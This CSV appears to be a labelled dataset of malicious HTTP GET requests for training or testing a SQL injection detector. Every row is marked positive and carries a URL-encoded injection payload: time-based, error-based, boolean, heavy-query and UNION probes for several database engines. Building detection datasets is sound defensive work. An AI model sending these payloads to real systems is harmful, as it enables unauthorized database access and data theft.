"id","label","source","source_url","method","url","path","query_string","headers","body","raw_request","notes"
"pos_modsec_learn_sqli_002049","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+and+5934++%3D++7745","/","p=1+and+5934++%3D++7745","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+and+5934++%3D++7745 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002050","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+and+6055++%3D++ctxsys.drithsx.sn++%28++6055%2C++%28++chr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++6055++%3D++6055++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113+++%29++++%29+++++%29++","/","p=1+and+6055++%3D++ctxsys.drithsx.sn++%28++6055%2C++%28++chr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++6055++%3D++6055++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113+++%29++++%29+++++%29++","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+and+6055++%3D++ctxsys.drithsx.sn++%28++6055%2C++%28++chr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++6055++%3D++6055++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113+++%29++++%29+++++%29++ HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002051","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+and+6240++%3D++++%28++%27qqpjq%27%7C%7C++%28++select+case+6240+when+6240+then+1+else+0+end+from+rdb%24database++%29++%7C%7C%27qzvzq%27++%29++--+izad","/","p=1+and+6240++%3D++++%28++%27qqpjq%27%7C%7C++%28++select+case+6240+when+6240+then+1+else+0+end+from+rdb%24database++%29++%7C%7C%27qzvzq%27++%29++--+izad","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+and+6240++%3D++++%28++%27qqpjq%27%7C%7C++%28++select+case+6240+when+6240+then+1+else+0+end+from+rdb%24database++%29++%7C%7C%27qzvzq%27++%29++--+izad HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002052","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+and+6969++%3D++++%28++select+6969+from+pg_sleep++%28++5+++%29++++%29+","/","p=1+and+6969++%3D++++%28++select+6969+from+pg_sleep++%28++5+++%29++++%29+","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+and+6969++%3D++++%28++select+6969+from+pg_sleep++%28++5+++%29++++%29+ HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002053","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+and+7533++%3D++7533--+spzi","/","p=1+and+7533++%3D++7533--+spzi","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+and+7533++%3D++7533--+spzi HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002054","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+and+elt++%28++8853++%3D++1675%2C1675++%29++--+jegm","/","p=1+and+elt++%28++8853++%3D++1675%2C1675++%29++--+jegm","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+and+elt++%28++8853++%3D++1675%2C1675++%29++--+jegm HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002055","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+and+extractvalue++%28++7982%2Cconcat++%28++0x5c%2C0x7171706a71%2C++%28++select+++%28++elt++%28++7982++%3D++7982%2C1+++%29++++%29+++++%29++%2C0x717a767a71+++%29++++%29+++%23+fmxq","/","p=1+and+extractvalue++%28++7982%2Cconcat++%28++0x5c%2C0x7171706a71%2C++%28++select+++%28++elt++%28++7982++%3D++7982%2C1+++%29++++%29+++++%29++%2C0x717a767a71+++%29++++%29+++%23+fmxq","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+and+extractvalue++%28++7982%2Cconcat++%28++0x5c%2C0x7171706a71%2C++%28++select+++%28++elt++%28++7982++%3D++7982%2C1+++%29++++%29+++++%29++%2C0x717a767a71+++%29++++%29+++%23+fmxq HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002056","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+and+sleep++%28++5++%29+","/","p=1+and+sleep++%28++5++%29+","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+and+sleep++%28++5++%29+ HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002057","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+or+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++sddo++%29++%23","/","p=1+or+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++sddo++%29++%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+or+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++sddo++%29++%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002058","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+or+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++ydpu++%29++%23+lwfs","/","p=1+or+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++ydpu++%29++%23+lwfs","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+or+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++ydpu++%29++%23+lwfs HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002059","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+or+2633++%3D++dbms_pipe.receive_message++%28++chr++%28++112++%29++%7C%7Cchr++%28++65++%29++%7C%7Cchr++%28++65++%29++%7C%7Cchr++%28++103++%29++%2C5++%29++--+pvdw","/","p=1+or+2633++%3D++dbms_pipe.receive_message++%28++chr++%28++112++%29++%7C%7Cchr++%28++65++%29++%7C%7Cchr++%28++65++%29++%7C%7Cchr++%28++103++%29++%2C5++%29++--+pvdw","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+or+2633++%3D++dbms_pipe.receive_message++%28++chr++%28++112++%29++%7C%7Cchr++%28++65++%29++%7C%7Cchr++%28++65++%29++%7C%7Cchr++%28++103++%29++%2C5++%29++--+pvdw HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002060","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+or+4411++%3D++++%28++select+count++%28++%2A++%29+++from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7++%29++--+ctdx","/","p=1+or+4411++%3D++++%28++select+count++%28++%2A++%29+++from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7++%29++--+ctdx","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+or+4411++%3D++++%28++select+count++%28++%2A++%29+++from+sysusers+as+sys1%2Csysusers+as+sys2%2Csysusers+as+sys3%2Csysusers+as+sys4%2Csysusers+as+sys5%2Csysusers+as+sys6%2Csysusers+as+sys7++%29++--+ctdx HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002061","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+or+5286++%3D++++%28++select+count++%28++%2A++%29+++from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5++%29++--+mtaq","/","p=1+or+5286++%3D++++%28++select+count++%28++%2A++%29+++from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5++%29++--+mtaq","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+or+5286++%3D++++%28++select+count++%28++%2A++%29+++from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5++%29++--+mtaq HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002062","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+or+6793++%3D++++%28++select+6793+from+pg_sleep++%28++5+++%29++++%29+","/","p=1+or+6793++%3D++++%28++select+6793+from+pg_sleep++%28++5+++%29++++%29+","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+or+6793++%3D++++%28++select+6793+from+pg_sleep++%28++5+++%29++++%29+ HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002063","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+or+7427++%3D++dbms_pipe.receive_message++%28++chr++%28++116++%29++%7C%7Cchr++%28++87++%29++%7C%7Cchr++%28++90++%29++%7C%7Cchr++%28++109++%29++%2C5++%29++--","/","p=1+or+7427++%3D++dbms_pipe.receive_message++%28++chr++%28++116++%29++%7C%7Cchr++%28++87++%29++%7C%7Cchr++%28++90++%29++%7C%7Cchr++%28++109++%29++%2C5++%29++--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+or+7427++%3D++dbms_pipe.receive_message++%28++chr++%28++116++%29++%7C%7Cchr++%28++87++%29++%7C%7Cchr++%28++90++%29++%7C%7Cchr++%28++109++%29++%2C5++%29++-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002064","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+or+9643++%3D++++%28++select+count++%28++%2A++%29+++from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3++%29++","/","p=1+or+9643++%3D++++%28++select+count++%28++%2A++%29+++from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3++%29++","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+or+9643++%3D++++%28++select+count++%28++%2A++%29+++from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3++%29++ HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002065","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+or+elt++%28++6272++%3D++6272%2Csleep++%28++5+++%29++++%29+++","/","p=1+or+elt++%28++6272++%3D++6272%2Csleep++%28++5+++%29++++%29+++","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+or+elt++%28++6272++%3D++6272%2Csleep++%28++5+++%29++++%29+++ HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002066","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+or+extractvalue++%28++1297%2Cconcat++%28++0x5c%2C0x7171706a71%2C++%28++select+++%28++elt++%28++1297++%3D++1297%2C1+++%29++++%29+++++%29++%2C0x717a767a71+++%29++++%29+++--+uslt","/","p=1+or+extractvalue++%28++1297%2Cconcat++%28++0x5c%2C0x7171706a71%2C++%28++select+++%28++elt++%28++1297++%3D++1297%2C1+++%29++++%29+++++%29++%2C0x717a767a71+++%29++++%29+++--+uslt","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+or+extractvalue++%28++1297%2Cconcat++%28++0x5c%2C0x7171706a71%2C++%28++select+++%28++elt++%28++1297++%3D++1297%2C1+++%29++++%29+++++%29++%2C0x717a767a71+++%29++++%29+++--+uslt HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002067","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+or+row++%28++1045%2C7562++%29++%3E++%28++select+count++%28++%2A++%29++%2Cconcat++%28++0x7171706a71%2C++%28++select+++%28++elt++%28++1045++%3D++1045%2C1+++%29++++%29+++++%29++%2C0x717a767a71%2Cfloor++%28++rand++%28++0++%29++%2A2+++%29++++%29+++x+from+++%28++select+8488+union+select+5584+union+select+3051+union+select+1210++%29++a+group+by+x++%29++%23+vojr","/","p=1+or+row++%28++1045%2C7562++%29++%3E++%28++select+count++%28++%2A++%29++%2Cconcat++%28++0x7171706a71%2C++%28++select+++%28++elt++%28++1045++%3D++1045%2C1+++%29++++%29+++++%29++%2C0x717a767a71%2Cfloor++%28++rand++%28++0++%29++%2A2+++%29++++%29+++x+from+++%28++select+8488+union+select+5584+union+select+3051+union+select+1210++%29++a+group+by+x++%29++%23+vojr","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+or+row++%28++1045%2C7562++%29++%3E++%28++select+count++%28++%2A++%29++%2Cconcat++%28++0x7171706a71%2C++%28++select+++%28++elt++%28++1045++%3D++1045%2C1+++%29++++%29+++++%29++%2C0x717a767a71%2Cfloor++%28++rand++%28++0++%29++%2A2+++%29++++%29+++x+from+++%28++select+8488+union+select+5584+union+select+3051+union+select+1210++%29++a+group+by+x++%29++%23+vojr HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002068","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+or+row++%28++1045%2C7562++%29++%3E++%28++select+count++%28++%2A++%29++%2Cconcat++%28++0x7171706a71%2C++%28++select+++%28++elt++%28++1045++%3D++1045%2C1+++%29++++%29+++++%29++%2C0x717a767a71%2Cfloor++%28++rand++%28++0++%29++%2A2+++%29++++%29+++x+from+++%28++select+8488+union+select+5584+union+select+3051+union+select+1210++%29++a+group+by+x++%29++--+fwzl","/","p=1+or+row++%28++1045%2C7562++%29++%3E++%28++select+count++%28++%2A++%29++%2Cconcat++%28++0x7171706a71%2C++%28++select+++%28++elt++%28++1045++%3D++1045%2C1+++%29++++%29+++++%29++%2C0x717a767a71%2Cfloor++%28++rand++%28++0++%29++%2A2+++%29++++%29+++x+from+++%28++select+8488+union+select+5584+union+select+3051+union+select+1210++%29++a+group+by+x++%29++--+fwzl","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+or+row++%28++1045%2C7562++%29++%3E++%28++select+count++%28++%2A++%29++%2Cconcat++%28++0x7171706a71%2C++%28++select+++%28++elt++%28++1045++%3D++1045%2C1+++%29++++%29+++++%29++%2C0x717a767a71%2Cfloor++%28++rand++%28++0++%29++%2A2+++%29++++%29+++x+from+++%28++select+8488+union+select+5584+union+select+3051+union+select+1210++%29++a+group+by+x++%29++--+fwzl HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002069","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+or+sleep++%28++5++%29++%23","/","p=1+or+sleep++%28++5++%29++%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+or+sleep++%28++5++%29++%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002070","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+procedure+analyse++%28++extractvalue++%28++5840%2Cconcat++%28++0x5c%2C0x7171706a71%2C++%28++select+++%28++case+when+++%28++5840++%3D++5840++%29+++then+1+else+0+end+++%29++++%29+++%2C0x717a767a71+++%29++++%29+++%2C1++%29++%23+mafe","/","p=1+procedure+analyse++%28++extractvalue++%28++5840%2Cconcat++%28++0x5c%2C0x7171706a71%2C++%28++select+++%28++case+when+++%28++5840++%3D++5840++%29+++then+1+else+0+end+++%29++++%29+++%2C0x717a767a71+++%29++++%29+++%2C1++%29++%23+mafe","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+procedure+analyse++%28++extractvalue++%28++5840%2Cconcat++%28++0x5c%2C0x7171706a71%2C++%28++select+++%28++case+when+++%28++5840++%3D++5840++%29+++then+1+else+0+end+++%29++++%29+++%2C0x717a767a71+++%29++++%29+++%2C1++%29++%23+mafe HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002071","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+union+all+select+null%2Cnull--","/","p=1+union+all+select+null%2Cnull--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+union+all+select+null%2Cnull-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002072","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+where+1096++%3D++1096+and+extractvalue++%28++7982%2Cconcat++%28++0x5c%2C0x7171706a71%2C++%28++select+++%28++elt++%28++7982++%3D++7982%2C1+++%29++++%29+++++%29++%2C0x717a767a71+++%29++++%29+++--","/","p=1+where+1096++%3D++1096+and+extractvalue++%28++7982%2Cconcat++%28++0x5c%2C0x7171706a71%2C++%28++select+++%28++elt++%28++7982++%3D++7982%2C1+++%29++++%29+++++%29++%2C0x717a767a71+++%29++++%29+++--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+where+1096++%3D++1096+and+extractvalue++%28++7982%2Cconcat++%28++0x5c%2C0x7171706a71%2C++%28++select+++%28++elt++%28++7982++%3D++7982%2C1+++%29++++%29+++++%29++%2C0x717a767a71+++%29++++%29+++-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002073","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+where+1656++%3D++1656+and+5556++%3D++++%28++select+count++%28++%2A++%29+++from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5++%29++--","/","p=1+where+1656++%3D++1656+and+5556++%3D++++%28++select+count++%28++%2A++%29+++from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5++%29++--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+where+1656++%3D++1656+and+5556++%3D++++%28++select+count++%28++%2A++%29+++from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5++%29++-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002074","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+where+1842++%3D++1842+or+8514++%3D++benchmark++%28++5000000%2Cmd5++%28++0x544d5a4c+++%29++++%29+++%23","/","p=1+where+1842++%3D++1842+or+8514++%3D++benchmark++%28++5000000%2Cmd5++%28++0x544d5a4c+++%29++++%29+++%23","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+where+1842++%3D++1842+or+8514++%3D++benchmark++%28++5000000%2Cmd5++%28++0x544d5a4c+++%29++++%29+++%23 HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002075","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+where+1931++%3D++1931+and+sleep++%28++5++%29++--","/","p=1+where+1931++%3D++1931+and+sleep++%28++5++%29++--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+where+1931++%3D++1931+and+sleep++%28++5++%29++-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002076","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+where+2239++%3D++2239+and+6969++%3D++++%28++select+6969+from+pg_sleep++%28++5+++%29++++%29+++--","/","p=1+where+2239++%3D++2239+and+6969++%3D++++%28++select+6969+from+pg_sleep++%28++5+++%29++++%29+++--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+where+2239++%3D++2239+and+6969++%3D++++%28++select+6969+from+pg_sleep++%28++5+++%29++++%29+++-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
"pos_modsec_learn_sqli_002077","1","modsec_learn_sqli","malicious/sqli_kaggle/sqli_parsed.json","GET","https://modsec-learn-sqli.local/?p=1+where+2751++%3D++2751+union+all+select+null%2Cnull%2Cnull%2Cnull--","/","p=1+where+2751++%3D++2751+union+all+select+null%2Cnull%2Cnull%2Cnull--","{""Host"": ""modsec-learn-sqli.local"", ""User-Agent"": ""Mozilla/5.0"", ""Accept"": ""*/*""}","","GET /?p=1+where+2751++%3D++2751+union+all+select+null%2Cnull%2Cnull%2Cnull-- HTTP/1.1
Host: modsec-learn-sqli.local
User-Agent: Mozilla/5.0
Accept: */*","modsec_learn_sqli:sqli_kaggle"
